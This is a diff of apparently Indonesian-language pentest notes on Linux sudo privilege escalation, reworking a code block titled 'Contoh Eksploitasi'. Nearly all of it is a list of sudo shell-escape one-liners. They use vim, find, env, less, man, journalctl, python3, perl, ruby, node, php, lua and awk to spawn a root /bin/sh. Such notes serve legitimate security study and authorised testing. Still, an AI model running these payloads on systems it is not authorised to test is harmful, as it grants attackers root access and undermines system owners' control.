@@ -93,33 +93,46 @@ Untuk setiap binary yang diizinkan → cek di [https://gtfobins.github.io](https
 ## Contoh Eksploitasi
 
 ```bash
-sudo vim -c ':!/bin/sh'                            # vim usr/bin/vim
-sudo find . -exec /bin/sh \; -quit                 # find usr/bin/find
-sudo python3 -c 'import os;os.system("/bin/sh")'   # python3 usr/bin/python3
-sudo env /bin/sh                                   # env usr/bin/env
-sudo less /etc/profile  -> !/bin/sh                 # less/more usr/bin/less/more
-sudo less -p '!/bin/sh' /etc/profile
-sudo less /etc/profile
-!/bin/sh 
-```
-
-Payload lengkap per binary (semua entry di tampilan rentan):
-
-```bash
-# --- shell langsung ---
+# bash / sh / zsh — langsung root shell
 sudo bash
 
-# --- editor & pager (ketik !/bin/sh di dalam pager) ---
-sudo less /etc/profile        # less/more → !/bin/sh
-sudo man man                  # man → !/bin/sh
-sudo journalctl               # output panjang dibuka via pager → !/bin/sh
+# env — runs shell via env utility
+sudo env /bin/sh
 
-# --- interpreter ---
+# vim — shell escape command-mode
+sudo vim -c ':!/bin/sh'
+
+# find — exec arbitrary command
+sudo find . -exec /bin/sh \; -quit
+
+# less / more — ketik !/bin/sh di dalam pager
+sudo less /etc/profile
+
+# man — pager dibuka otomatis, ketik !/bin/sh
+sudo man man
+
+# journalctl — output panjang dibuka via pager, ketik !/bin/sh
+sudo journalctl
+
+# python3 — spawn shell via Python
+sudo python3 -c 'import os;os.system("/bin/sh")'
+
+# perl — exec shell
 sudo perl -e 'exec "/bin/sh"'
+
+# ruby — exec shell
 sudo ruby -e 'exec "/bin/sh"'
+
+# node — spawn shell
 sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+
+# php — pcntl_exec shell
 sudo php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+
+# lua — os.execute shell
 sudo lua -e 'os.execute("/bin/sh")'
+
+# awk — system() menjalankan command
 sudo awk 'BEGIN{system("/bin/sh")}'
 ```
 
